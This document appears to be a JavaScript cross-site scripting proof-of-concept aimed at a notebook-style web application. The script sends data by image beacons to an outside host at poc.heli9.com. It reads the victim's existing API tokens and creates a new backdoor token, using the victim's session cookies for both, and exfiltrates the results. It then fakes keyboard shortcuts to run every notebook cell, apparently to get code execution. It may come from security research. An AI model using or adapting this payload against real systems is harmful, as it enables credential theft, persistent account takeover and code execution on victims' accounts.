(async function() {
    const EXFIL = 'https://poc.heli9.com/jet/log.php';
    
    function exfil(type, data) {
        const payload = btoa(JSON.stringify({
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            domain: document.domain
        }));
        new Image().src = EXFIL + '?type=' + encodeURIComponent(type) + 
                          '&d=' + encodeURIComponent(payload.slice(0, 2000));
    }
    
    exfil('xss_executed', { domain: document.domain, url: location.href });
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/list', {
            credentials: 'include'
        });
        if (resp.ok) {
            const tokens = await resp.json();
            exfil('stolen_existing_tokens', tokens);
        }
    } catch(e) {}
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/create', {
            method: 'POST',
            credentials: 'include'
        });
        if (resp.ok) {
            const newToken = await resp.json();
            exfil('backdoor_token_created', newToken);
        }
    } catch(e) {}
    
    function triggerRunAll() {
        const event = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            which: 13,
            shiftKey: true,
            altKey: true,
            metaKey: false,
            ctrlKey: false,
            bubbles: true,
            cancelable: true,
            composed: true,
            view: window
        });
        
        document.dispatchEvent(event);
        document.body.dispatchEvent(event);
        window.dispatchEvent(event);
        
        if (document.activeElement) {
            document.activeElement.dispatchEvent(event);
        }
        
        const editors = document.querySelectorAll('.editor-content, .worksheet-content, .notebook-content, .cell-content');
        editors.forEach(el => el.dispatchEvent(event));
        
        exfil('rce_triggered', { method: 'keyboard_shortcut_alt_shift_enter' });
    }
    
    setTimeout(triggerRunAll, 5000);
    
    exfil('xss_complete', 'Exploitation complete');
    console.log('[POC] XSS executed on: ' + document.domain);
    
})();
